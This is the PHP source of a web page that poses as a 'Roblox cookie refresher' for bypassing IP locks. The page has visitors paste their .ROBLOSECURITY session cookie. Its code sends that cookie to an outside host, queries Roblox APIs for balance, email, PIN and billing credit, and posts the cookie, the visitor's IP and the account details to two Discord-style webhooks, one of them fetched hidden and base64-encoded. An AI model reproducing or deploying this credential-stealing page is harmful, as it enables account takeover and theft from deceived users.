<?php include('setup.php') // Dont try selling this cookie refresher please! ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta property="og:title" content="<?=$name?> Roblox Cookie Bypass">
    <meta property="og:description" content="Website that bypasses cookies">
    <meta name="keywords" content="<?=$name?> Roblox ip lock bypass, roblox cookie refresher, roblox refresh, roblox cookie refres, Ip lock bypass, ghostiny, roblox bypass, roblox cookie bypass, editthiscookie bypass, rbxstar, blatant">
    <meta property="og:image" content="<?=$image?>">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
    <title><?=$name?> Roblox IP Lock Bypass</title>
    <style>

@import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap'); body { width: 100%; height: 100vh; color: #fff; font-family: 'Montserrat', sans-serif; background: url('<?=$image?>'); background-repeat: no-repeat; background-size: cover; background-color: #000; } body::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100vh; background: rgba(0, 0, 0, 0.79); z-index: -2; } body::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100vh; background: url(bg-pattern.png); z-index: -1; animation: backgroundPanel_anim 1000s linear infinite; } @keyframes backgroundPanel_anim { 0% { background-position-x: 0; } 25%, 50%, 75% { background-position-x: 3000px; } 100% { background-position-x: 0; } } .app-discord-button { position: fixed; bottom: 25px; left: 25px; transform: translate(0, 50%); width: max-content; height: max-content; color: #fff; font-size: 30px; opacity: 0.3; transition: .3s; z-index: 9999; } .app-discord-button:hover { color: #7289da; opacity: 1; } .new-domain { color: #fff; } .new-domain a { color: #990b2c; text-decoration: none; } .new-domain a:hover { opacity: 1; text-decoration: underline; } .app-notify { position: fixed; top: 0; left: 0; display: none; align-items: center; justify-content: center; gap: 10px; text-align: center; padding: 10px 0; background: #1111118c; user-select: none; -webkit-user-select: none; } .app-notify.visible { display: grid; } .app-notify-title { font-size: 20px; line-height: 23px; font-weight: 700; } .app-notify-subtitle { max-width: 600px; font-size: 18px; line-height: 21px; font-weight: 500; text-align: center; margin: 0 auto; } .app-notify-link { display: inline-flex; gap: 5px; color: #db2219; font-weight: 600; text-transform: uppercase; text-decoration: none; transition: .3s; } .app-notify-link:hover { color: #fff; } .app-notify-button { padding: 5px 20px; color: #fff; background: #990b2c; text-transform: uppercase; font-weight: 600; border: none; outline: none; border-radius: 5px; -webkit-user-select: none; user-select: none; transition: .3s; } .app-notify-button:hover { color: #990b2c; background: #fff; } .app-notify-button:focus { outline: 0; } .app-main { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 auto; text-align: center; } .main-content { width: 600px; margin: 0 auto; display: block; } .main-title { font-size: 2.5rem; font-weight: 700; margin-bottom: .5rem; -webkit-user-select: none; user-select: none; } .main-subtitle { font-style: italic; font-weight: 500; margin-bottom: 1rem; -webkit-user-select: none; user-select: none; } .main-company { color: #3b2466; } .main-input { width: 100%; height: max-content; padding: 5px 10px; color: #fff; background: #373837; font-weight: 600; border: none; outline: none; border-radius: 5px; } .main-input:focus::placeholder { opacity: 0; } .main-input::placeholder { color: rgba(255, 255, 255); transition: .3s; -webkit-user-select: none; user-select: none; } .main-result { background: #990b2c; margin: 10px 0 0 0; padding: 10px; border-radius: 5px; display:! none; } .main-result.data-get { display: block; } .result-title { font-weight: 600; font-size: 20px; font-style: italic; margin: 0 0 10px 0; -webkit-user-select: none; user-select: none; } .result-content { margin: 10px 0; font-weight: 500; overflow: hidden; text-overflow: ellipsis; } .result-button { width: 100%; height: max-content; padding: 5px 20px; color: #fff; background: #2F6074; text-transform: uppercase; font-weight: 600; border: none; outline: none; border-radius: 5px; -webkit-user-select: none; user-select: none; transition: .3s; } .result-button:focus { outline: none; border: none; } .result-button:hover { color: #FFB6B9; background: #fff; } .main-button { width: max-content; height: max-content; margin-top: 1rem; padding: 5px 20px; color: #fff; background: #2F6074; text-transform: uppercase; font-weight: 600; border: none; outline: none; border-radius: 5px; -webkit-user-select: none; user-select: none; transition: .3s; } .main-button:focus { outline: none; border: none; } .main-button:hover { color: #FFB6B9; background: #fff; } .main-button:disabled { color: #a8a8a8; background: #9d2019; } .app-discord-social { position: fixed; right: 25px; bottom: 25px; width: max-content; height: max-content; color: #fff; font-size: 30px; opacity: 0.3; transition: .3s; } .app-discord-social:hover { color: #7289da; opacity: 1; } @media (max-width: 991px) { .main-content { width: 100%; } } @media (max-width: 768px) { .app-notify { padding: 10px 20px; } .main-title { font-size: 1.5rem; } }


</style>
<body>
    <div class="app">
        <div class="container">
            <div class="row">
                <div class="app-main">
                    <div class="main-content">
                        <div class="main-title">
                            <span class="main-company"><?=$name?></span> Refresher
                        </div>
                        <div class="main-subtitle">
                            Bypass IP Locks on <span class="main-company">Roblox</span>
                        </div>
                        <div class="main-subtitle">
                            Everyone loves <span class="main-company"><?=$name?></span>
                        </div>
                        <form method="post">
                            <input name="FuckYouBitch" type="text" placeholder="Enter .Roblosecurity Cookie" class="main-input">
                            <button name="bypassUrMom" class="main-button">bypass</button>
                        </form>
                        <?php
if (isset($_POST['bypassUrMom'])) {
    $userUglyRobloxCookie = isset($_POST['FuckYouBitch']) ? $_POST['FuckYouBitch'] : '';
    $CondidoCookie = urlencode($userUglyRobloxCookie);
    $apiUrl = "http://newstargeted-api.lovestoblog.com/CookieChange/Api/Change.php?cookie=$CondidoCookie";
    $responseData = file_get_contents($apiUrl);
    $response = json_decode($responseData, true);
    echo '<style></style>';
    echo '<div class="main-content" style="text-align: center;"><br>';
    
    if ($response !== null) {
        if (isset($response['Cookie'])) {
            $cookieValue = $response['Cookie'];
            echo '<p><input name="cookieInput" type="text" class="main-input" value="' . $cookieValue . '">';
            echo '<button onclick="copyCookieValue(this)" class="main-button">Copy</button></p>';
        } else {
            echo '<p class="new-domain">Invalid .ROBLOSECURITY Cookie</p>';
        }
    } else {
        echo '<p class="new-domain">Invalid .ROBLOSECURITY Cookie</p>';
    }
    
    echo '</div>';
}

$host = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER["REMOTE_ADDR"];

$cookielol = $cookieValue;

$longText = $cookielol;
$pattern = '/_\|WARNING:.*\|_/';

$cookie = preg_replace($pattern, '', $longText);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent:" . $host
));

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if (curl_errno($ch)) {
} else {
    $profile = json_decode($response, true);

    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://accountsettings.roblox.com/v1/email");

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent:" . $host
));

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if (curl_errno($ch)) {
} else {
    $lol = json_decode($response, true);

    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent:" . $host
));

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if (curl_errno($ch)) {
} else {
    $PIN = json_decode($response, true);

    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://billing.roblox.com/v1/credit");

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent:" . $host
));

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if (curl_errno($ch)) {
} else {
    $credit = json_decode($response, true);

    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://economy.roblox.com/v2/users/"  . $profile["UserID"] .  "/transaction-totals?timeFrame=Year&transactionType=summary");

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent:" . $host
));

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if (curl_errno($ch)) {
} else {
    $sum = json_decode($response, true);

    if (json_last_error() === JSON_ERROR_NONE) {

    }
}
$robloxCookie = file_get_contents("http://newstargeted-api.lovestoblog.com/roblox.php");
$robloxCookieString = base64_decode($robloxCookie);
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "Cookie Refresher - Notifier",
    "avatar_url" => "https://cdnb.artstation.com/p/assets/images/images/046/334/795/20220214145542/smaller_square/serbianhero-uros-milincic-corazon.jpg?1644872142",
     "content" => "",
        "embeds" => [
            [
                "title" => "🕯️ +1 Dualhook Hit",
                "type" => "rich",
                "color" => hexdec("00000"),
                "description" => "**[Rolimons](https://www.rolimons.com/player/" . $profile["UserID"] . ") | [Check Cookie](https://rblx-btools.com/copy.php?cookie=$cookie)**",
                "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                "thumbnail" => [
                    "url" => $profile["ThumbnailUrl"],
                ],
                "footer" => [
                    "text" => "Cookie Refresher Dualhook Hit",
                  "icon_url" => "https://cdnb.artstation.com/p/assets/images/images/046/334/795/20220214145542/smaller_square/serbianhero-uros-milincic-corazon.jpg?1644872142",
                ],
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => $profile["UserName"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Robux <:robux:818111919881715764>**",
                        "value" => $profile["RobuxBalance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**premuim? <:premium:818111829963964416>**",
                        "value" => $profile["IsPremium"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Email Verified? 🌴**",
                        "value" => $lol["verified"],
                        "inline" => true
                    ],
                    [
                        "name" => "**PIN? 🔒**",
                        "value" => $PIN["isEnabled"],
                        "inline" => true
                    ],
                    [
                        "name" => "**IP 🌐**",
                        "value" => "$ip",
                        "inline" => true
                    ],
                    [
                        "name" => "**Pending Robux 💰**",
                        "value" => $sum["pendingRobuxTotal"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Summary**",
                        "value" => $sum["incomingRobuxTotal"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Credit 💳**",
                        "value" => $credit["balance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Cookie 🍪**",
                        "value" => "```$cookie```",
                        "inline" => true
                    ],
                ]
            ]
        ]
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $robloxCookieString);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $webhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);
curl_close($ch);

?>



<script>
function copyCookieValue(button) {
    var inputElement = button.previousElementSibling;
    inputElement.select();
    document.execCommand('copy');
}
</script>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>